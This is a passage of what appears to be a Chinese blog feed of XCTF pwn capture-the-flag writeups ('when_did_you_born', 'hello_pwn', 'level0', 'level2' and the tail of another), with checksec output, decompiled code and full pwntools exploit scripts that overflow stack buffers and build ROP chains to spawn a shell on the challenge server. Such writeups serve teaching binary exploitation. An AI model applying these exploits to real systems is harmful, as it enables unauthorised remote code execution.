class="string">"1"</span>)</span><br></pre></td></tr></table></figure><blockquote><p>下面我们将system写入返回地址处，因为v13是一个字符类型的数组，所以我们需要地址分解为4部分，然后向连续的地址中进行写入：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change_addr</span><span class="params">(offset,addr_part)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"5. exit\n"</span>,<span class="string">"3"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"which number to change:\n"</span>,str(offset))</span><br><span class="line">r.sendlineafter(<span class="string">"new number:\n"</span>,str(addr_part))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">Change_addr(offset+i,system_addr[i])</span><br></pre></td></tr></table></figure><blockquote><p>下面我们将sh写入system参数的正确的位置，和上一步一样：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change_addr</span><span class="params">(offset,addr_part)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"5. exit\n"</span>,<span class="string">"3"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"which number to change:\n"</span>,str(offset))</span><br><span class="line">r.sendlineafter(<span class="string">"new number:\n"</span>,str(addr_part))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">Change_addr(offset+j+<span class="number">8</span>,sh[j])<span class="comment"># 一定要记得这里的偏移+8</span></span><br></pre></td></tr></table></figure><blockquote><p>结束程序运行，并与系统进行交互</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x03-EXP"><a href="#0x03-EXP" class="headerlink" title="0x03 EXP"></a><font color="navy"><code>0x03 EXP</code></font></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">"debug"</span>,arch=<span class="string">"i386"</span>,os=<span class="string">"linux"</span>,endian=<span class="string">"little"</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">35029</span>)</span><br><span class="line">retn_esp = <span class="number">0xffffd8bc</span></span><br><span class="line">ebp = <span class="number">0xffffd8a8</span></span><br><span class="line">v13 = ebp - <span class="number">0x70</span></span><br><span class="line">offset = retn_esp - ebp + <span class="number">0x70</span></span><br><span class="line">print(<span class="string">"[*] offset is"</span>,offset,<span class="string">"("</span>,hex(offset),<span class="string">")"</span>)</span><br><span class="line">system_addr = [<span class="number">0x50</span>,<span class="number">0x84</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br><span class="line">sh = [<span class="number">0x87</span>,<span class="number">0x89</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"How many numbers you have:\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Give me your numbers\n"</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change_addr</span><span class="params">(offset,addr_part)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"5. exit\n"</span>,<span class="string">"3"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"which number to change:\n"</span>,str(offset))</span><br><span class="line">r.sendlineafter(<span class="string">"new number:\n"</span>,str(addr_part))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"><span class="comment"># 开始</span></span><br><span class="line">start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向返回地址写入system地址</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">Change_addr(offset+i,system_addr[i])</span><br><span class="line">print(<span class="string">"[*] offset is"</span>,offset)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向system的参数位置写入sh地址</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">Change_addr(offset+j+<span class="number">8</span>,sh[j])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结束</span></span><br><span class="line">r.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a><font color="navy"><code>0x04 Reference</code></font></h3><p>[1] <a href="https://www.zhihu.com/question/23440081" target="_blank" rel="noopener">为什么C语言中数组下标越界不报错？</a></p><p>[2]  <a href="https://www.52tourism.com/C/42666.html?btwaf=35062607" target="_blank" rel="noopener">计算机为什么用二进制和十六进制</a></p><p>[3] <a href="https://senitco.github.io/2017/06/07/string-processing/" target="_blank" rel="noopener">C/C++处理十六进制数和字符串</a></p><p>[4] <a href="http://liul14n.top/2019/11/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Pwn%E8%BF%9B%E9%98%B6%E5%8C%BA(1" target="_blank" rel="noopener">攻防世界-Pwn进阶区(1)</a>/)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-相关知识点&quot;&gt;&lt;a href=&quot;#0x00-相关知识点&quot; class=&quot;headerlink&quot; title=&quot;0x00.相关知识点&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00.相关知识点&lt;/code&gt;&lt;/font&gt;&lt;/h3&gt;&lt;h
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【XCTF-pwn】新手区writeup（part1）</title>
    <link href="https://muzibing.github.io/2020/06/01/2020.06.01%EF%BC%88122%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/01/2020.06.01（122）/</id>
    <published>2020-05-31T16:00:00.000Z</published>
    <updated>2020-06-03T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-when_did_you_bornfont"><a class="markdownIt-Anchor" href="#font-color-navy0x00-when_did_you_bornfont"></a> <font color="navy"><code>0x00 when_did_you_born</code></font></h3><h4 id="1相关知识点"><a class="markdownIt-Anchor" href="#1相关知识点"></a> <code>1.相关知识点</code></h4><blockquote><ol><li>64位下的栈溢出原理</li></ol></blockquote><h4 id="2解题思路"><a class="markdownIt-Anchor" href="#2解题思路"></a> <code>2.解题思路</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=718185b5ec9c26eb9aeccfa0ab53678e34fee00a, stripped</span><br></pre></td></tr></table></figure><blockquote><p><code>pwn</code>文件是一个64位的ELF可执行文件，也就是说在以后的分析中要注意这个条件C</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=718185b5ec9c26eb9aeccfa0ab53678e34fee00a, stripped</span><br><span class="line">root@kali:~/Documents/CTF/PWN/XCTF/pwn/1/when_did_you)_pwn# checksec pwn</span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/when_did_you)_pwn/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><p>没有开启地址随机化,，开启了cookie，开启了栈不可执行保护</p></blockquote><p><img src="/images/122-2.jpg" alt></p><blockquote><p>从图中可以看出，要想成功的打印出flag，就需要满足<code>v6 == 1926</code>，但是前面有一个条件要满足<code>v6!=1926</code>，所以说程序要正常执行的话，肯定是不能打印出flag的，就需要我们想办法绕过第一个条件<code>v6!=1926</code>，我们看到后面还要我们输入一个<code>v5</code>的值，且v5位于<code>ebp-0x20</code>，而又因为<code>v6</code>位于<code>ebp-0x18</code>，这两个内存空间紧紧的连着，所以虽然开启了canary，但是我们这里也可以利用第二个输入点，实现栈溢出来绕过第一个条件，满足<code>v6 == 1926</code></p></blockquote><h4 id="3解题步骤"><a class="markdownIt-Anchor" href="#3解题步骤"></a> <code>3.解题步骤</code></h4><blockquote><p>因为本题中较简单，看解题思路即可</p></blockquote><h4 id="4exp"><a class="markdownIt-Anchor" href="#4exp"></a> <code>4.EXP</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">57772</span>)<span class="comment"># 包括本题及以下题目的exp中的ip地址和端口号需要更换题目中给出的</span></span><br><span class="line">r.recvuntil(<span class="string">"What's Your Birth?"</span>)</span><br><span class="line">r.sendline(<span class="string">"1111"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"What's Your Name?"</span>)<span class="comment"># 到达溢出点</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">8</span> + str(p64(<span class="number">1926</span>),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x01-hello_pwnfont"><a class="markdownIt-Anchor" href="#font-color-navy0x01-hello_pwnfont"></a> <font color="navy"><code>0x01 hello_pwn</code></font></h3><h4 id="1相关知识点-2"><a class="markdownIt-Anchor" href="#1相关知识点-2"></a> <code>1.相关知识点</code></h4><blockquote><ol><li>地址偏移</li></ol></blockquote><h4 id="2解题思路-2"><a class="markdownIt-Anchor" href="#2解题思路-2"></a> <code>2.解题思路</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=05ef7ecf06e02e7f199b11c4647880e8379e6ce0, stripped</span><br></pre></td></tr></table></figure><blockquote><p>该pwn文件是一个64位的ELF文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec pwn</span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/hello_pwn/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><p>就开启了一个栈不可执行</p></blockquote><p><img src="/images/122-3.png" alt></p><blockquote><p>从上图中可以看到一个read函数和一个<code>sub_400686()</code>函数，而<code>sub_400686()</code>函数是打印出flag，所以只要满足<code>dword_60106C == 1853186401</code>即可，那么在这里<code>dword_60106C</code>表示的是什么意思呢？不知道没关系，下面我用gdb进行调试：</p></blockquote><p><img src="/images/122-4.png" alt></p><blockquote><p>从上图中可以看出，如果要想执行<code>sub_400686()</code>函数，要使得<code>eax</code>中所指向的值和<code>0x6e756161</code>相等，而<code>eax</code>中存放的是<code>0x60106c</code>地址，那么到这里我们就应该清楚了<code>dword_60106C</code>和<code>unk_601068</code>分别表示的是<code>0x60106c</code>和<code>0x601068</code>地址中的值，两者相差4个字节，为了验证一下，在运行程序时，输入点的地方输入的是“<code>AAAA1234567890</code>”，分别看一下这两处地址的值为多少，结果如下图：</p></blockquote><p><img src="/images/122-6.png" alt></p><blockquote><p>从上图可以看出<code>0x601068</code>地址的值为<code>AAAA1234567890</code>，而<code>0x601068c</code>地址处的值为<code>1234567890</code>，所以说我们可以利用这个来满足条件语句。</p></blockquote><h4 id="3解题步骤-2"><a class="markdownIt-Anchor" href="#3解题步骤-2"></a> <code>3.解题步骤</code></h4><blockquote><p>【见解题思路】</p></blockquote><h4 id="4exp-2"><a class="markdownIt-Anchor" href="#4exp-2"></a> <code>4.EXP</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python</span></span><br><span class="line"><span class="comment">#! usr/bin/env python</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">"debug"</span>,endian=<span class="string">"little"</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>)</span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">37261</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"lets get helloworld for bof"</span>)</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">4</span> + str(p64(<span class="number">0x6E756161</span>),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x02-level0"><a class="markdownIt-Anchor" href="#font-color-navy0x02-level0"></a> <font color="navy"><code>0x02 level0</code></font></h3><h4 id="1相关知识点-3"><a class="markdownIt-Anchor" href="#1相关知识点-3"></a> <code>1.相关知识点</code></h4><blockquote><ol><li>64位下传参顺序：前六个参数是通过<code>rdi、rsi、rdx、rcx、r8、r9</code>进行传参的，后面的就是通过栈进行传参</li></ol></blockquote><h4 id="2解题思路-3"><a class="markdownIt-Anchor" href="#2解题思路-3"></a> <code>2.解题思路</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dc0b3ec5a7b489e61a71bc1afa7974135b0d3d4, not stripped</span><br></pre></td></tr></table></figure><blockquote><p>该文件是一个64位的ELF文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec pwn</span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/level0/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><p>只开启了栈不可执行保护</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main函数</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// vulnerable_function();函数</span></span><br><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-80h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以从上图中发现，read函数存在着栈溢出的危险漏洞，我们可以从IDA中看到，该文件中有一个callsystem的函数，于是这道题目就相对容易了</p></blockquote><h4 id="3解题步骤-3"><a class="markdownIt-Anchor" href="#3解题步骤-3"></a> <code>3.解题步骤</code></h4><blockquote><p>【见解题思路】</p></blockquote><h4 id="4exp-3"><a class="markdownIt-Anchor" href="#4exp-3"></a> <code>4.EXP</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">"linux"</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">52526</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#system_addr = 0x400460</span></span><br><span class="line">system_addr_call = elf.symbols[<span class="string">"callsystem"</span>]</span><br><span class="line"><span class="comment">#bin_sh_addr = 0x400684</span></span><br><span class="line">r.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x80</span>*<span class="string">"a"</span> + <span class="number">8</span>*<span class="string">"a"</span> + str(p64(system_addr_call),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line"><span class="comment"># payload = 0x80*"a" + 8*"a" + str(p64(system_addr),encoding="unicode_escape")+ 8*"a" + str(p64(bin_sh_addr),encoding="unicode_escape")</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h4 id="5存在的问题"><a class="markdownIt-Anchor" href="#5存在的问题"></a> <code>5.存在的问题</code></h4><blockquote><ol><li>为什么payload不能为<code>payload = 0x80*&quot;a&quot; + 8*&quot;a&quot; + str(p64(system_addr),encoding=&quot;unicode_escape&quot;)+ 8*&quot;a&quot; + str(p64(bin_sh_addr),encoding=&quot;unicode_escape&quot;)</code></li><li>为什么exp还可以为下方所示：</li></ol></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">"linux"</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">52526</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400663</span></span><br><span class="line">system_addr = <span class="number">0x0000000000400460</span></span><br><span class="line">bin_sh_addr = <span class="number">0x0000000000400684</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x80</span>*<span class="string">"a"</span> + <span class="number">8</span>*<span class="string">"a"</span> + str(p64(pop_rdi),encoding=<span class="string">"unicode_escape"</span>) + str(p64(bin_sh_addr),encoding=<span class="string">"unicode_escape"</span>) + str(p64(system_addr),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x03-level2font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-level2font"></a> <font color="navy"><code>0x03 level2</code></font></h3><h4 id="1相关知识点-4"><a class="markdownIt-Anchor" href="#1相关知识点-4"></a> <code>1.相关知识点</code></h4><blockquote><ol><li>栈溢出的条件：可以输入的大于分配的</li><li>函数调用时栈中的情况</li></ol><p><img src="/images/119-3.jpg" alt></p></blockquote><h4 id="2解题思路-4"><a class="markdownIt-Anchor" href="#2解题思路-4"></a> <code>2.解题思路</code></h4><p><code>分析</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># file pwn </span><br><span class="line"></span><br><span class="line">pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a70b92e1fe190db1189ccad3b6ecd7bb7b4dd9c0, not stripped</span><br></pre></td></tr></table></figure><blockquote><p><code>pwn</code>文件是一个32位的ELF可执行文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># checksec pwn</span><br><span class="line"></span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/level2/pwn&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><blockquote><p>没有开启地址随机化和cookie，开启了栈不可执行保护</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main 函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">"echo 'Hello World!'"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// vulnerable_function()函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-88h]@1</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>从上面程序的源代码中可以看出，在<code>vulnerable_function()</code>函数中存在着栈溢出漏洞，因为buf被分配了0x88大小的空间，但实际能输入0x100大小，因此会造成溢出</p></blockquote><h4 id="3解题步骤-4"><a class="markdownIt-Anchor" href="#3解题步骤-4"></a> <code>3.解题步骤</code></h4><blockquote><p>对于本题来说，我们已经找到了溢出点，那么我们的解题思路如下：</p><ul><li>找出“system”和”/bin/sh“的地址</li><li>构造出payload</li></ul></blockquote><p><font color="red"><code>找出system和/bin/sh的地址</code></font></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># ROPgadget --binary pwn --string &quot;system&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0804824b : system</span><br><span class="line"></span><br><span class="line"># ROPgadget --binary pwn --string &quot;/bin/sh&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0804a024 : /bin/sh</span><br></pre></td></tr></table></figure><blockquote><p>查找”system“函数和“/bin/sh”字符串的地址，可知system的地址为：<code>0x0804824b</code>，/bin/sh的地址为<code>0x0804a024</code></p></blockquote><p><font color="red"><code>构造payload</code></font></p><blockquote><p>根据上述分析，我们可以构造如下payload</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x88</span> + <span class="string">"a"</span>*<span class="number">4</span> + str(p32(system),encoding=<span class="string">"unicode_escape"</span>) + <span class="string">"a"</span>*<span class="number">4</span> + str(p32(/bin/sh),encoding=<span class="string">"unicode_escape"</span>)</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>&quot;a&quot;*0x88</code>：这是buf要填充的字节</li><li><code>&quot;a&quot;*4</code>：是填充<code>Old 